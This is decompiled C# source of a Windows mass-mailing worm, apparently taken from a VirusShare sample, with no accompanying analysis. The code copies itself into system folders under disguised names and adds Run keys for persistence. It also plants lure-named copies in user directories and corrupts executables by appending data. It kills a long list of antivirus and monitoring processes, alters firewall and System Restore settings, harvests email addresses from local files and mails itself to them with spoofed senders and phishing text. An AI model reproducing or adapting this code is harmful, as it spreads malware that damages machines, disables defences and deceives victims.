// Decompiled with JetBrains decompiler
// Type: Amir.Amir
// Assembly: virus, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 29FAD37A-A306-4DD1-B69F-F402CC0E6FE7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Email-Worm.Win32.NetSky.gqw-84f16e85d2b28953d61e95f48fa22b03859b066aae1c5ea68cc014b2af0ecfb8.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Web.Mail;
using System.Windows.Forms;

namespace Amir
{
  internal class Amir
  {
    public void ccopy()
    {
      try
      {
        Directory.CreateDirectory("C:\\Amir30vIL");
        File.Copy(Application.ExecutablePath, Environment.SystemDirectory + "\\MDM32.exe");
        File.Copy(Application.ExecutablePath, Environment.SystemDirectory + "\\WinKrnl32.cab.exe");
        File.Copy(Application.ExecutablePath, Environment.SystemDirectory + "\\Update.exe");
        Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "MDM32.exe", (object) (Environment.SystemDirectory + "\\MDM32.exe"), RegistryValueKind.String);
        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WinKrnl32.cab.exe", (object) (Environment.SystemDirectory + "\\WinKrnl32.cab.exe"), RegistryValueKind.String);
        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Update.exe", (object) (Environment.SystemDirectory + "\\Update.exe"), RegistryValueKind.String);
      }
      catch (Exception ex)
      {
      }
    }

    public void DispEXE(string tD)
    {
      try
      {
        string[] directories = Directory.GetDirectories(tD);
        string[] strArray = new string[36]
        {
          "own",
          "it",
          "upl",
          "syst",
          "se",
          "usic",
          "efu",
          "am",
          "caf",
          "yma",
          "mp3",
          "wav",
          "ovi",
          "roj",
          "win",
          "ict",
          "my",
          "ina",
          "Shar",
          "aza",
          "onk",
          "mob",
          "tart",
          "ffic",
          "av",
          "rack",
          "ile",
          "W32",
          "root",
          "assw",
          "Sounds",
          "ideo",
          "rit",
          "ist",
          "ys",
          "orn"
        };
        foreach (string input in directories)
        {
          try
          {
            foreach (string pattern in strArray)
            {
              try
              {
                if (Regex.IsMatch(input, pattern))
                {
                  if (Regex.IsMatch(input, "it"))
                    File.Copy(Application.ExecutablePath, input + "\\NewWeb.exe");
                  if (Regex.IsMatch(input, "own"))
                    File.Copy(Application.ExecutablePath, input + "\\Downloader.pif");
                  if (Regex.IsMatch(input, "upl"))
                    File.Copy(Application.ExecutablePath, input + "\\upload-file.exe");
                  if (Regex.IsMatch(input, "syst"))
                    File.Copy(Application.ExecutablePath, input + "\\system.dll.cmd");
                  if (Regex.IsMatch(input, "se"))
                    File.Copy(Application.ExecutablePath, input + "\\SexyScreenSaver.scr");
                  if (Regex.IsMatch(input, "usic"))
                    File.Copy(Application.ExecutablePath, input + "\\MyMiusic.exe");
                  if (Regex.IsMatch(input, "efu"))
                    File.Copy(Application.ExecutablePath, input + "\\defult-path.cmd");
                  if (Regex.IsMatch(input, "ame"))
                    File.Copy(Application.ExecutablePath, input + "\\FunGame.flash.exe");
                  if (Regex.IsMatch(input, "caf"))
                    File.Copy(Application.ExecutablePath, input + "\\Mcafee-AV.pif");
                  if (Regex.IsMatch(input, "ort"))
                    File.Copy(Application.ExecutablePath, input + "\\PortScanner.exe");
                  if (Regex.IsMatch(input, "yma"))
                    File.Copy(Application.ExecutablePath, input + "\\SymantecUpdate.exe");
                  if (Regex.IsMatch(input, "p3"))
                    File.Copy(Application.ExecutablePath, input + "\\Mp3Player.pif");
                  if (Regex.IsMatch(input, "av"))
                    File.Copy(Application.ExecutablePath, input + "\\WaveToMp32.exe");
                  if (Regex.IsMatch(input, "ovi"))
                    File.Copy(Application.ExecutablePath, input + "\\Fun.pif");
                  if (Regex.IsMatch(input, "win"))
                    File.Copy(Application.ExecutablePath, input + "\\winUpdate.cab.cmd");
                  if (Regex.IsMatch(input, "roj"))
                    File.Copy(Application.ExecutablePath, input + "\\install-project.exe");
                  if (Regex.IsMatch(input, "ict"))
                    File.Copy(Application.ExecutablePath, input + "\\mypic.scr");
                  if (Regex.IsMatch(input, "my"))
                    File.Copy(Application.ExecutablePath, input + "\\myboy.exe");
                  if (Regex.IsMatch(input, "ina"))
                    File.Copy(Application.ExecutablePath, input + "\\NewWinamp.exe");
                  if (Regex.IsMatch(input, "Shar"))
                    File.Copy(Application.ExecutablePath, input + "\\Perl-install.pif");
                  if (Regex.IsMatch(input, "aza"))
                    File.Copy(Application.ExecutablePath, input + "\\Learning.exe");
                  if (Regex.IsMatch(input, "mob"))
                    File.Copy(Application.ExecutablePath, input + "\\mobileAV.exe");
                  if (Regex.IsMatch(input, "tart"))
                    File.Copy(Application.ExecutablePath, input + "\\WinUser32.dll.exe");
                  if (Regex.IsMatch(input, "ffic"))
                    File.Copy(Application.ExecutablePath, input + "\\newOffice.exe");
                  if (Regex.IsMatch(input, "rack"))
                    File.Copy(Application.ExecutablePath, input + "\\TrackPlayer.exe");
                  if (Regex.IsMatch(input, "ile"))
                    File.Copy(Application.ExecutablePath, input + "\\readMe.Txt.pif");
                  if (Regex.IsMatch(input, "orn"))
                    File.Copy(Application.ExecutablePath, input + "\\pornoPic.scr");
                  if (Regex.IsMatch(input, "W32"))
                    File.Copy(Application.ExecutablePath, input + "\\WinLearning.htm.cmd");
                  if (Regex.IsMatch(input, "root"))
                    File.Copy(Application.ExecutablePath, input + "\\DefultRoot.pif");
                  if (Regex.IsMatch(input, "assw"))
                    File.Copy(Application.ExecutablePath, input + "\\PasswordFinder.exe");
                  if (Regex.IsMatch(input, "Sounds"))
                    File.Copy(Application.ExecutablePath, input + "\\NewSound.cmd");
                  if (Regex.IsMatch(input, "ideo"))
                    File.Copy(Application.ExecutablePath, input + "\\0110Video.pif");
                  if (Regex.IsMatch(input, "rit"))
                    File.Copy(Application.ExecutablePath, input + "\\CDWriter.exe");
                  if (Regex.IsMatch(input, "ist"))
                    File.Copy(Application.ExecutablePath, input + "\\NewList.exe");
                  if (Regex.IsMatch(input, "ys"))
                    File.Copy(Application.ExecutablePath, input + "\\Secure.exe");
                }
              }
              catch (Exception ex)
              {
              }
            }
          }
          catch (Exception ex)
          {
          }
        }
        foreach (string directory in Directory.GetDirectories(tD))
          this.DispEXE(directory);
      }
      catch (Exception ex)
      {
      }
    }

    public void happy()
    {
      if (DateTime.Now.Day != 19)
        return;
      int num = (int) MessageBox.Show("happy birthday mr.AmIrCiViL", "Amir30vil", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    public void infect(string tf)
    {
      try
      {
        foreach (string file in Directory.GetFiles(tf, "*.exe"))
        {
          try
          {
            BinaryWriter binaryWriter = new BinaryWriter((Stream) new FileStream(file, FileMode.Open, FileAccess.Write));
            binaryWriter.BaseStream.Seek(0L, SeekOrigin.End);
            for (int index = 0; index < 70; ++index)
              binaryWriter.Write("AmIrCiViL");
            binaryWriter.Close();
          }
          catch (Exception ex)
          {
          }
        }
        foreach (string directory in Directory.GetDirectories(tf))
          this.infect(directory);
      }
      catch (Exception ex)
      {
      }
    }

    public void killer()
    {
      try
      {
        string[] strArray = new string[424]
        {
          "ACKWIN32",
          "ADAWARE",
          "ADVXDWIN",
          "AGENTSVR",
          "AGENTW ",
          "ALERTSVC",
          "ALEVIR",
          "ALOGSERV",
          "AMON9X ",
          "ANTI-TROJAN",
          "ANTIVIRUS ",
          "ANTS ",
          "APIMONITOR",
          "APLICA32 ",
          "APVXDWIN ",
          "ARR ",
          "ATCON",
          "ATRO55EN",
          "ATUPDATER",
          "ATUPDATER ",
          "ATWATCH ",
          "AU ",
          "AUPDATE",
          "AUPDATE ",
          "AUTODOWN ",
          "AUTODOWN",
          "AUTOTRACE ",
          "AUTOTRACE ",
          "AUTOUPDATE ",
          "AUTOUPDATE ",
          "AVCONSOL ",
          "AVE32 ",
          "AVGCC32",
          "AVGCTRL",
          "AVGNT ",
          "AVGSERV",
          "AVGSERV9",
          "AVGW ",
          "AVKPOP",
          "AVKSERV",
          "AVKSERVICE",
          "AVKWCTl9 ",
          "AVLTMAIN ",
          "AVNT ",
          "AVP ",
          "AVP32",
          "AVPCC ",
          "AVPDOS32",
          "AVPM ",
          "AVPTC32",
          "AVPUPD ",
          "AVPUPD ",
          "AVSCHED32",
          "AVSYNMGR",
          "AVWINNT ",
          "AVWUPD ",
          "AVWUPD32",
          "AVWUPD32 ",
          "AVWUPSRV ",
          "AVXMONITOR9X",
          "AVXMONITORNT ",
          "AVXQUAR ",
          "AVXQUAR ",
          "BACKWEB ",
          "BARGAINS ",
          "BD_PROFESSIONAL",
          "BEAGLE",
          "BELT ",
          "BIDEF ",
          "BIDSERVER",
          "BIPCP",
          "BIPCPEVALSETUP ",
          "BISP",
          "BLACKD",
          "BLACKICE",
          "BLSS",
          "BOOTCONF",
          "BOOTWARN",
          "BORG2 ",
          "BPC ",
          "BRASIL",
          "BS120",
          "BUNDLE",
          "BVT ",
          "CCAPP",
          "CCEVTMGR",
          "CCPXYSVC ",
          "CDP ",
          "CFD",
          "CFGWIZ",
          "CFIADMIN",
          "CFIAUDIT",
          "CFINET",
          "CFINET32",
          "CLEAN",
          "CLEANER",
          "CLEANER3",
          "CLEANPC ",
          "CLICK ",
          "CMD32 ",
          "CMESYS ",
          "CMGRDIAN",
          "CMON016 ",
          "CONNECTIONMONITOR",
          "CPD ",
          "CPF9X206",
          "CPFNT206",
          "CTRL ",
          "CV ",
          "CWNB181",
          "CWNTDWMO ",
          "IEXPLORER",
          "IFACE ",
          "IFW2000",
          "INETLNFO",
          "INFUS ",
          "INFWIN",
          "INIT ",
          "INTDEL",
          "INTREN ",
          "IOMON98",
          "ISTSVC ",
          "JAMMER ",
          "JDBGMRG ",
          "JEDI ",
          "KAVLITE40ENG ",
          "KAVPERS40ENG ",
          "KAVPF ",
          "KAZZA",
          "KEENVALUE",
          "KERIO-PF-213-EN-WIN",
          "KERIO-WRL-421-EN-WIN",
          "KERIO-WRP-421-EN-WIN",
          "KERNEL32",
          "KILLPROCESSSETUP161",
          "LAUNCHER",
          "LDNETMON ",
          "LDPRO ",
          "LDPROMENU",
          "LDSCAN",
          "LNETINFO",
          "LOADER ",
          "LOCALNET",
          "LOCKDOWN",
          "LOCKDOWN2000",
          "LOOKOUT ",
          "LORDPE ",
          "LSETUP",
          "LUALL ",
          "LUAU ",
          "LUCOMSERVER ",
          "LUINIT ",
          "LUSPT",
          "MAPISVC32",
          "MCAGENT ",
          "MCMNHDLR ",
          "MCSHIELD ",
          "MCTOOL ",
          "MCUPDATE",
          "MCUPDATE ",
          "MCVSRTE",
          "MCVSSHLD ",
          "MD ",
          "MFIN32",
          "MFW2EN ",
          "MFWENG3.02D30 ",
          "MGAVRTCL ",
          "MGAVRTE ",
          "MGHTML",
          "MGUI ",
          "MINILOG",
          "MMOD",
          "MONITOR",
          "MOOLIVE",
          "MOSTAT ",
          "MPFAGENT ",
          "MPFSERVICE ",
          "MPFTRAY ",
          "MRFLUX",
          "MSAPP ",
          "MSBB ",
          "MSBLAST",
          "MSCACHE ",
          "MSCCN32 ",
          "MSCMAN ",
          "MSCONFIG",
          "MSDM ",
          "MSDOS",
          "MSIEXEC16",
          "MSINFO32",
          "MSLAUGH ",
          "MSMGT ",
          "MSMSGRI32",
          "MSSMMC32",
          "MSSYS ",
          "MSVXD",
          "MU0311AD",
          "MWATCH ",
          "N32SCANW",
          "NAV ",
          "AUTO-PROTECT.NAV80TRY",
          "NAVAP.NAVAPSVC",
          "NAVAPSVC ",
          "NAVAPW32",
          "NAVDX ",
          "NAVLU32",
          "NAVNT ",
          "NAVSTUB ",
          "NAVW32",
          "NAVWNT",
          "NC2000 ",
          "NCINST4",
          "NDD32 ",
          "NEOMONITOR ",
          "NEOWATCHLOG ",
          "NETARMOR ",
          "NETD32 ",
          "NETINFO",
          "NETMON",
          "NETSCANPRO",
          "NETSPYHUNTER-1.2",
          "NETSTAT ",
          "NETUTILS",
          "NISSERV ",
          "NISUM ",
          "NMAIN ",
          "NOD32 ",
          "NORMIST",
          "NORTON_INTERNET_SECU_3.0_407",
          "NOTSTART",
          "NPF40_TW_98_NT_ME_2K",
          "NPFMESSENGER ",
          "NPROTECT",
          "NPSCHECK",
          "NPSSVC ",
          "NSCHED32",
          "NSSYS32",
          "NSTASK32",
          "NSUPDATE",
          "NT",
          "NTRTSCAN",
          "NTVDM",
          "NTXconfig",
          "NUI",
          "NUPGRADE",
          "NUPGRADE",
          "NVARCH16",
          "NVC95",
          "NVSVC32",
          "NWINST4",
          "NWSERVICE",
          "NWTOOL16",
          "OLLYDBG",
          "ONSRVR",
          "OPTIMIZE",
          "OSTRONET",
          "OTFIX",
          "OUTPOST",
          "OUTPOST",
          "OUTPOSTINSTALL",
          "OUTPOSTPROINSTALL",
          "PADMIN",
          "PANIXK",
          "PATCH",
          "PAVCL",
          "PAVPROXY",
          "PAVSCHED",
          "PAVW",
          "PCFWALLICON",
          "PCIP10117_0",
          "PCSCAN",
          "PDSETUP",
          "PERISCOPE",
          "PERSFW",
          "PERSWF",
          "PF2",
          "PFWADMIN",
          "PGMONITR",
          "PINGSCAN",
          "PLATIN",
          "POP3TRAP",
          "POPROXY",
          "POPSCAN",
          "PORTDETECTIVE",
          "PORTMONITOR",
          "POWERSCAN",
          "PPINUPDT",
          "PPTBC",
          "PPVSTOP",
          "PRIZESURFER",
          "PRMT",
          "PRMVR",
          "PROCDUMP",
          "PROCESSMONITOR",
          "PROCEXPLORERV1.0",
          "PROGRAMAUDITOR",
          "PROPORT",
          "PROTECTX ",
          "PSPF",
          "PURGE",
          "QCONSOLE",
          "QSERVER",
          "RAPAPP",
          "RAV7",
          "RAV7WIN",
          "RAV8WIN32ENG",
          "RAY",
          "RB32",
          "RCSYNC",
          "REALMON",
          "REGED",
          "REGEDIT",
          "REGEDT32",
          "RESCUE",
          "RESCUE32",
          "RRGUARD",
          "RSHELL",
          "RTVSCAN",
          "RTVSCN95",
          "RULAUNCH",
          "RUN32DLL",
          "RUNDLL",
          "RUNDLL16",
          "RUXDLL32",
          "SAFEWEB",
          "SAHAGENT ",
          "SAVE",
          "SAVENOW",
          "SBSERV",
          "SC",
          "SCAM32",
          "SCAN32",
          "SCAN95",
          "SCANPM",
          "SCRSCAN",
          "SETUPVAMEEVAL",
          "SETUP_FLOWPROTECTOR_US",
          "SFC",
          "SGSSFW32",
          "SH",
          "SHELLSPYINSTALL",
          "SHN",
          "SHOWBEHIND",
          "SMC",
          "SMS",
          "SMSS32",
          "SOAP",
          "SOFI",
          "SPERM",
          "SPF",
          "SPHINX",
          "SPOLER",
          "SPOOLCV",
          "SPOOLSV32",
          "SPYXX",
          "SREXE",
          "SRNG",
          "SS3EDIT",
          "SSGRATE",
          "SSG_4104",
          "ST2",
          "START",
          "STCLOADER",
          "SUPFTRL",
          "SUPPORT",
          "SUPPORTER5",
          "SVC",
          "SVCHOSTC",
          "SVCHOSTS",
          "SVSHOST",
          "SWEEP95 ",
          "SWEEPNET.SWEEPSRV.SYS.SWNETSUP",
          "SYMPROXYSVC",
          "SYMTRAY",
          "SYSEDIT ",
          "SYSTEM",
          "SYSTEM32",
          "SYSUPD",
          "TASKMG",
          "TASKMO",
          "TASKMON",
          "TAUMON",
          "TBSCAN",
          "TC",
          "TCA",
          "TCM",
          "TDS-3",
          "TDS2-NT",
          "TEEKIDS",
          "TFAK",
          "TFAK5",
          "TGBOB",
          "TITANIN",
          "TITANINXP",
          "TRACERT",
          "TRICKLER",
          "TRJSCAN",
          "TRJSETUP",
          "TROJANTRAP3",
          "TSADBOT",
          "TVMD",
          "TVTMD",
          "UNDOBOOT",
          "UPDAT",
          "UPDATE",
          "UPDATE",
          "UPGRAD",
          "UTPOST",
          "VBCMSERV",
          "VBCONS",
          "VBUST ",
          "VBWIN9X",
          "VBWINNTW",
          "VCSETUP",
          "VET32 ",
          "VET95",
          "vb6",
          "taskmgr",
          "regedit",
          "notepad",
          "install",
          "setup",
          "MpfConsole",
          "AmIrCiViL"
        };
        foreach (string processName in strArray)
        {
          try
          {
            foreach (Process process in Process.GetProcessesByName(processName))
              process.CloseMainWindow();
          }
          catch (Exception ex)
          {
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    public void massmail(string td)
    {
      try
      {
        try
        {
          File.Copy(Application.ExecutablePath, Environment.SystemDirectory + "\\mail.pif");
          File.Copy(Application.ExecutablePath, Environment.SystemDirectory + "\\YourPassword.html.pif");
          File.Copy(Application.ExecutablePath, Environment.SystemDirectory + "\\ScreenSaver.scr");
          File.Copy(Application.ExecutablePath, Environment.SystemDirectory + "\\Winamp2006.exe");
          File.Copy(Application.ExecutablePath, Environment.SystemDirectory + "\\NewEmule.exe");
          File.Copy(Application.ExecutablePath, Environment.SystemDirectory + "\\DotNetFrameWork.exe");
        }
        catch (Exception ex)
        {
        }
        string filename = new string[6]
        {
          "mail.pif",
          "YourPassword.html.pif",
          "ScreenSaver.scr",
          "Winamp2006.ex",
          "NewEmule.exe",
          "DotNetFrameWork.exe"
        }[new Random().Next(0, 6)];
        string str1 = new string[6]
        {
          "Delivery Failure",
          "Deliver Mail",
          "Failed",
          "Mail System",
          "Status",
          "Unknown Exception"
        }[new Random().Next(0, 6)];
        string str2 = new string[13]
        {
          "Thank you for using file",
          "+++ Attachment: No Virus (Clean)",
          "It has come to our attention that your (File!) User Profile ( x )records are out of date. For further details see the attached document.Tank you for using !",
          "+++ report file",
          "Your e-mail account was used to send a huge amount of unsolicited spam messages during the recent week. If you could please take 5-10 minutes out of your online experience and confirm the attached document so you will not run into any future problems with the online service.",
          "Deliver Error",
          "Message Error",
          "help attached",
          "such as yours",
          "illegal st. of you?",
          "I have your password! ",
          "classroom test of you?",
          "old screen about you?"
        }[new Random().Next(0, 13)];
        string str3 = new string[20]
        {
          "mcafee@yahoo.com",
          "symantec@yahoo.com",
          "nod32@yahoo.com",
          "panda@yahoo.com",
          "avg@yahoo.com",
          "emule@yahoo.com",
          "info@yahoo.com",
          "ebook@yahoo.com",
          "LongShot@yahoo.com",
          "winamp@yahoo.com",
          "update@yahoo.com",
          "matt@yahoo.com",
          "steve@yahoo.com",
          "smith@yahoo.com",
          "stan@yahoo.com",
          "bill@yahoo.com",
          "bob@yahoo.com",
          "YourFriend@yahoo.com",
          " mail@yahoo.com",
          "ted@yahoo.com"
        }[new Random().Next(0, 20)];
        string[] strArray = new string[13]
        {
          "*htm",
          "*txt",
          "*xml",
          "*adb",
          "*asp",
          "*cfg",
          "*cgi",
          "*dbx",
          "*eml",
          "*pl",
          "*shtm",
          "*wab",
          "*vbs"
        };
        try
        {
          foreach (string searchPattern in strArray)
          {
            foreach (string file in Directory.GetFiles(td, searchPattern))
            {
              Regex regex = new Regex("[a-zA-Z0-9-_.-]+@[a-zA-Z0-9-_.-]+\\.[com]+");
              FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read);
              byte[] numArray = new byte[fileStream.Length];
              fileStream.Read(numArray, 0, (int) fileStream.Length);
              fileStream.Close();
              foreach (Match match in regex.Matches(Encoding.ASCII.GetString(numArray)))
              {
                string input = match.ToString();
                try
                {
                  MailMessage message = new MailMessage();
                  message.From = str3;
                  message.To = input;
                  message.Cc = "info@yahoo.com";
                  message.Bcc = "AV@yahoo.com";
                  message.Subject = str1;
                  message.Body = str2;
                  if (Regex.IsMatch(input, "@yahoo.com"))
                    SmtpMail.SmtpServer = "mx1.mail.yahoo.com";
                  if (Regex.IsMatch(input, "@hotmail.com"))
                    SmtpMail.SmtpServer = "mx1.hotmail.com";
                  message.Attachments.Add((object) new MailAttachment(filename, MailEncoding.Base64));
                  SmtpMail.Send(message);
                }
                catch (Exception ex)
                {
                }
              }
            }
          }
        }
        catch (Exception ex)
        {
        }
      }
      catch (Exception ex)
      {
      }
      try
      {
        foreach (string directory in Directory.GetDirectories(td))
          this.massmail(directory);
      }
      catch (Exception ex)
      {
      }
    }

    public void regist2()
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      string[] strArray = new string[26]
      {
        "Taskmon",
        "Explorer",
        "Windows Services Host",
        "KasperskyAV",
        " d3dupdate.exe",
        "au.exe",
        "OLE",
        "winupd.exe",
        "direct.exe ",
        "jijbl ",
        "Video ",
        "service",
        "DELETE ME",
        "d3dupdate.exe",
        "Sentry",
        "gouday.exe",
        "rate.exe",
        "Windows Services Host",
        "sysmon.exe ",
        "srate.exe",
        "ssate.exe ",
        "Microsoft IE Execute shell",
        "Winsock2 driver",
        "ICM version",
        "yeahdude.exe ",
        "Microsoft System Checkup"
      };
      foreach (string name in strArray)
      {
        try
        {
          registryKey.DeleteValue(name);
        }
        catch (Exception ex)
        {
        }
      }
    }

    public void regist3()
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      string[] strArray = new string[35]
      {
        "MCAgentExe",
        "MCUpdateExe",
        "WinampAgent",
        "OASClnt",
        "Taskmon",
        "Explorer",
        "Windows Services Host",
        "KasperskyAV",
        "System",
        "msgsvr32",
        "service",
        "Sentry",
        "Explorer",
        "system",
        "msgsvr32",
        "au.exe",
        "winupd.exe",
        "direct.exe ",
        "jijbl ",
        "Video ",
        "service",
        "DELETE ME",
        "d3dupdate.exe",
        "Sentry",
        "gouday.exe",
        "rate.exe",
        "Windows Services Host",
        "sysmon.exe ",
        "srate.exe",
        "ssate.exe ",
        "Microsoft IE Execute shell",
        "Winsock2 driver",
        "ICM version",
        "yeahdude.exe ",
        "Microsoft System Checkup"
      };
      foreach (string name in strArray)
      {
        try
        {
          registryKey.DeleteValue(name);
        }
        catch (Exception ex)
        {
        }
      }
    }

    public void setreg()
    {
      try
      {
        Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess", "Start", (object) "4", RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
      }
    }

    public void setreg7()
    {
      try
      {
        Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\\\ControlSet001\\\\Services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\StandardProfile", "EnableFirewal", (object) "1", RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
      }
    }

    public void setreg8()
    {
      try
      {
        Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\\\Microsoft\\\\OLE", "EnableDCOM", (object) "N", RegistryValueKind.String);
      }
      catch (Exception ex)
      {
      }
    }

    public void setreg9()
    {
      try
      {
        Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SystemRestore", "DisableSR", (object) "1", RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
      }
    }
  }
}
